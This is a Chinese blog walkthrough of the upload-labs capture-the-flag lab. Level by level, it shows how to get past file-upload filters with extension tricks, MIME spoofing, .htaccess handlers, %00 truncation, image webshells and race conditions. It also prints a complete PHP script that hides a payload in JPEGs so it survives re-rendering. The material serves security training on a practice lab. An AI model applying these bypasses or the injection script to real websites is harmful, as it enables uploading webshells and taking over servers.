---
title: upload-labs 通关攻略
published: 2021-04-15 10:35
tags: [文件上传]
category: CTF
draft: false
---

# upload-labs通关攻略

## 第一关

第一关通过右键查看源代码或者提示，我们不难发现是一个前端验证，一般前端验证都是纸老虎，形同虚设。

![](/images/posts/upload-labs/1.png)

所以第一关的通关方法有三种：

第一就是将浏览器js代码禁用掉，右键---检查---调试器---设置---禁用JavaScript。快捷方式：f12---f1就可以了

![](/images/posts/upload-labs/2.png)

然后就可以上传了。

![](/images/posts/upload-labs/3.png)

这种方法有缺陷，因为禁用了js代码，如果在实战中，网站的一些正常功能可能无法显示。当然打靶通关是可以的。

第二种方法是用bp抓包工具直接将改后缀名

![](/images/posts/upload-labs/4.png)

如果js代码是在本地运行，很可能抓不到数据包。这种方法也是不太行，同样通过第一关是可以的。

第三种方法是将网站源码复制下来，放到本地，然后将js代码删除。

右键---查看网站源代码---全部复制---创建一个记事本---将代码放进去---把记事本后缀名改为.html---用Notepad打开---找到js代码---删除

![](/images/posts/upload-labs/5.png)

如果我们打开，是有上传文件的界面，但是不知道要上传给谁。这时我们返回到最开始，右键---检查---网络---然后上传一个正常的图片。这样我们就可以看到这个文件传给谁了。

![](/images/posts/upload-labs/6.png)

然后我们在用Notepad打开我们自己的html文件，修改action,这个action是告诉他这个图片提交给谁，因为这个源代码中没有，我们就自己加一个。

![](/images/posts/upload-labs/7.png)

最后用浏览器打开我们的html文件，上传。php文件即可。建议学会用第三种方法，在实战中，可能会遇到很多限制条件，第三种方法才是最完美的。





## 第二关

根据源代码我们可以发现，这一关是常见验证中的文件类型验证，也就是验证MIME信息

![](/images/posts/upload-labs/8.png)

所以进行抓包，将Content-Type修改为允许上传的类型（image/jpeg、image/png、image/gif）三选一。

![](/images/posts/upload-labs/9.png)

查看回显，发现已经上传成功

![](/images/posts/upload-labs/10.png)

访问一下

![](/images/posts/upload-labs/11.png)

第二关完美通关







## 第三关

查看源代码，我们可以发现是一个黑名单验证

![](/images/posts/upload-labs/12.png)

黑名单是规定不允许上传的文件，但是如果黑名单定义不完整的话是可以实现绕过的，用.phtml .phps .php5 .pht进行绕过。这里我们直接上传一个.php5文件

![](/images/posts/upload-labs/13.png)

上传成功,访问看一下

![](/images/posts/upload-labs/14.png)

因为上传上去的文件名会改变，但是在数据包中有回显（实战中可能没有），所以我们还是可以访问的。

第三关就完美通过了

**注意**

要在apache的httpd.conf中有如下配置代码：AddType application/x-httpd-php .php .phtml .phps .php5 .pht，如果不配置他是无法解析php5代码的，访问的时候就是一个空白页

配置过程：以phpstudy2018版本为例：

1.打开其他选项单

![](/images/posts/upload-labs/15.png)

2.打开配置文件---打开httpd.conf

3.修改代码，去掉注释符#

![](/images/posts/upload-labs/16.png)

4.保存，重启phpstudy就可以了









## 第四关

这一关我们可以看到禁止上传文件可太多了

![](/images/posts/upload-labs/17.png)

这种情况，我们可以尝试上传一个.htaccess配置文件，将4.png图片当作php代码进行解析，首先创建一个.htaccess文件，里面写上代码：

```
<FilesMatch "4.png">
SetHandler application/x-httpd-php
```

这串代码的意思是如果文件中有一个4.png的文件，他就会被解析为.php，把这个文件上传上去。上传上去之后，我们在把图片用Notepad打开，里面写上php代码。再进行上传。
最后我们访问这个4.png文件

![](/images/posts/upload-labs/18.png)

第四关就完美通过了

**注意**

.htaccess文件不能起名字，他就是.htaccess文件，如果你将他改为4.htaccess或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。

如果以上操作都弄好了，还是出不来，还是去改phpstudy配置文件，其他选项菜单--打开配置文件---httpd.conf

![](/images/posts/upload-labs/19.png)

箭头指向位置一开始none,改为all保存，重启phpstudy，就可以了。









## 第五关

第五关其实是有些upload-labs的第九关，我也认为把这关放到第九关比较合适。如果你的第五关和我的不一样，那么我的第六关就是你的第五关，依次类推到第九关。

这一关的思路是它没有循环验证，也就是说这些收尾去空，删除末尾的点，去除字符串::$DATA，转换为小写这些东西只是验证了一次。所以我们的绕过思路就很简单，在数据包中把后缀名改为.php. .说一下他的验证过程，首先他发现有一个点，这时会把他去掉，又发现有一个空格，也会把它去掉，我们这时还有一个点，也就是.“php. ”

由于他只是验证一次，所以不会在去掉我们的点，这时就可以上传成功，也可以解析成功。如下图:

![](/images/posts/upload-labs/58.png)

上传成功，然后访问

![](/images/posts/upload-labs/59.png)

第五关完美通关







## 第六关

看第六关的代码我们知道，这一关没有强制将大写转换为小写，所以我们可以上传纯大写或者大小写结合的后缀名

![](/images/posts/upload-labs/20.png)

但是要注意不要和限制上传的文件后缀名写重复了。

直接上传一个后缀名为.PHP的文件：

![](/images/posts/upload-labs/21.png)

我们可以看到上传成功，访问

![](/images/posts/upload-labs/22.png)

第六关就完美通关了。











## 第七关

直接看代码，发现没有收尾去空。上传php文件，抓包在后面加空格。

![](/images/posts/upload-labs/23.png)

然后我们可以发现上传成功，访问

![](/images/posts/upload-labs/24.png)

第七关闯关成功









## 第八关

第八关我们可以发现没有删除文件名末尾的点，和第七关思路一样，就是把空格换成点

![](/images/posts/upload-labs/25.png)

然后我们可以发现上传成功，访问

![](/images/posts/upload-labs/26.png)

第八关闯关成功







## 第九关

第九关查看代码发现没有去除字符串::$DATA（关于什么是::$DATA参考上一篇文章），和第六七关一样，直接上传，在数据包的php后面直接加上::$DATA

![](/images/posts/upload-labs/27.png)

然后我们可以发现上传成功，访问

![](/images/posts/upload-labs/28.png)

第九关闯关成功









## 第十关

第十关可以和第三关相同，也可以和第五关的黑名单相似，可以上传.htaccess文件，这里直接构造后缀名，按照源码不同顺序的过滤进行绕过。

```
把后缀名改为“.php. .”即可
```







## 第十一关

第十一关也是黑名单的绕过，他的意思是如果你上传了上面规定的文件，他就会把你的后缀名去掉。

比如你上传了11.php，那么他就会把你的php过滤掉。文件没有了后缀名，自然也就无法解析了。

但是他是一次过滤，也就是说我们写两个php进行双写绕过就可以了：11.pphphp,他过滤掉一个，正好剩下了11.php。如下图所示：

![](/images/posts/upload-labs/29.png)

上传成功，然后访问

![](/images/posts/upload-labs/30.png)

十一关通关

### 总结

```
这些全部为黑名单绕过，而且只是验证一次，所以这些关卡全部可以用一个思路解出来，那就是.php. . 都是可以这样的，但是这就违背了创建靶场者的心思，靶场也就失去了意义，发挥不出靶场真正的作用。大家知道有这么一回事就可以了。所以大家还是按照本篇老老实实打一遍，通关不是目的，让知识得到巩固才是目的。
```



# upload-labs(12-21关)

接下来的主要就是白名单的绕过，直接开干。

## 第十二关

第十二关我们看代码，可以得知是一个白名单，只允许上传'jpg','png','gif'格式的文件。但是上传路径是可以控制的，可以使用%00进行截断。

```
%00只能用于php版本低于5.3的。这里我们需要把phpstudy切换一下版本,把magic_quotes_gpc关闭
以phpstudy为例：其他选项菜单---php扩展及设置---参数开关设置---把magic_quotes_gpc关闭。
```

![](/images/posts/upload-labs/31.png)

接下来就上传,要上传jpg文件。然后去修改地址

![](/images/posts/upload-labs/32.png)

这里相当于上传了一个12.php文件到upload中，%00就是截断了，后面的不要了。

访问

![](/images/posts/upload-labs/33.png)

这样就可以了，顺利通关。









## 第十三关

第十三关和第十二关是差不多的，只不过是接受值变成了post,她两的差别呢就是get会自行解码，post不会自行解码，我们需要对%00进行编码,选中%00右键，按下图操作来

![](/images/posts/upload-labs/34.png)

编码好，我们就可以上传了

![](/images/posts/upload-labs/35.png)

上传成功，访问

![](/images/posts/upload-labs/36.png)

第十三关成功

## 第十四关

第十四关是用图片+php代码，组成一个图片码进行上传，当然要想解析出来这个图片，还得有这个包含漏洞。我们看到，他已经说了，网站存在包含漏洞

```
首先制作一个图片马，可以直接用Notepad直接打开图片后面加一个php代码，但是需要16进制，要不然图片可能出错。

也可以cmd进行生成，命令语句：copy 14.jpg /b + 14.php /a webshell.jpg 如图所示，我们在上传这个生成后的图片。
```

![](/images/posts/upload-labs/37.png)

上传

![](/images/posts/upload-labs/38.png)

访问

![](/images/posts/upload-labs/39.png)

看一下访问的地址，因为一开始就说了有一个包含漏洞

![](/images/posts/upload-labs/40.png)

所以地址要加上file

第十四关闯关成功。









## 第十五关

第十五关我们要了解一个函数

![](/images/posts/upload-labs/41.png)

我们来看这个 getimagesize函数，这个函数的意思是：会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的

所以这关还是用和14关一样的方法，生成带有php代码的图片上传，配合包含漏洞拿下此关。

![](/images/posts/upload-labs/42.png)

上传成功，访问

![](/images/posts/upload-labs/43.png)

十五关通关成功











## 第十六关

第16关同14，15关思路一样，操作一样。但是需要打开php_exif，

```
phpstudy的其他选项菜单---打开配置文件---php-ini
```

![](/images/posts/upload-labs/44.png)

重启phpstudy即可

```
exif_imagetype() 读取一个图像的第一个字节并检查其签名。

本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上或和 $_SERVER['HTTP_ACCEPT'] 结合使用来检查浏览器是否可以显示某个指定的图像。
```

通过过程参考14，15关。











## 第十七关

第十七关主要是把二次渲染绕过imagecreatefromjpeg（）函数二次渲染是由Gif文件或 URL 创建一个新图象。成功则返回一图像标识符/图像资源，失败则返回false，导致图片马的数据丢失，上传图片马失败。

```
1、按照原来的方法进行上传，我们可以发现还是可以上传的，但是配合包含漏洞却无法解析，这时我们把上传的图片复制下来用Notepad打开，发现我们原来写的php代码没有了，这就是二次渲染把我们里面的php代码删掉了。

2、我们把原图和他修改过的图片进行比较，看看哪个部分没有被修改。将php代码放到没有被更改的部分，配合包含漏洞，就可以了。

3、使用winhex或者HxD Hex Editor等工具进行比较
HxD Hex Editor下载地址：https://mh-nexus.de/en/hxd
```

然后比较

![](/images/posts/upload-labs/45.png)

具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的，知道怎么解就可以了。

```php
<?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = "<?=phpinfo();?>";


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }
    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>

```

```bash
上传1.jpg后下载被二次渲染的jpg命名为2.jpg，然后进行脚本处理
php 二次渲染.php 2.jpg
# 生成payload_2.jpg
```









## 第十八关

第十八关主要是对条件竞争的考察，我们看代码他是先将图片上传上去，才开始进行判断后缀名、二次渲染。如果我们在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除、二次渲染。这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。

操作：直接上传一个php文件，然后进行抓包，将数据包发送至intruder下，如图操作

![](/images/posts/upload-labs/46.png)

然后如图操作修改

![](/images/posts/upload-labs/47.png)

再修改一下线程

![](/images/posts/upload-labs/48.png)

然后发包，用另一个浏览器一直访问18.php地址，只要在上传的一瞬间，他还没来的及删除、修改就可以了。（卡吧）

![](/images/posts/upload-labs/49.png)

18关完美通关。









## 第十九关

第十九关的上传路径有点问题，不是上传到了upload里面，建议修改一下，进入第十九关，找到myupload.php文件，如图所示修改。

![](/images/posts/upload-labs/50.png)

重启就可以了。

这关是检查了后缀名，然后上传，然后在进行二次渲染。这时我们只能上传图片马，而且得配合解析漏洞进行通关

操作和18关的一样，就是访问地址是加上包含漏洞的。

![](/images/posts/upload-labs/51.png)

没什么问题，这些漏洞其实都是逻辑上的漏洞，二次渲染本身是没什么问题的。如果人家先验证在进行上传那就没有办法了。

19关完美通关。









## 第二十关

20关是两种通关方法：

```
第一种

move_uploaded_file()函数中的img_path是由post参数save_name控制的，可以在save_name利用%00截断（注意php版本低于5.3）。
```

如图：

![](/images/posts/upload-labs/52.png)

访问

![](/images/posts/upload-labs/53.png)

由于这种前面关卡已经用过，相信作者真正用意不是考这个。

```
第二种

move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 /.
```

所以我们把他修改为如图所示

![](/images/posts/upload-labs/54.png)

访问

![](/images/posts/upload-labs/55.png)

第二十关完美通关









## 第二十一关

方法一：上传图片马，文件包含、解析漏洞

方法二：利用数组绕过验证

```
首先进行00截断
```

```
将Content-Type字段改为被允许的任意一种（此处我改为的是image/png）并将数据包中的name="save_name"以数组的形式发送，并将数组的最后一位改成可被成功放行的（jpg,png,gif）中的任意一种。
```

<img src="/images/posts/upload-labs/56.jpg" alt="56"  />

访问

![](/images/posts/upload-labs/57.png)

```
二十关是一个黑名单，php/.就可以绕过，但是二十一关他会检测文件后缀名，是一个白名单。所以把他拆分掉第三部分是png，所以就会上传。实际上他上传上去的东西是upload-21.php/png，上传上去的东西就是upload-21.php。实现了绕过。
```

完美通关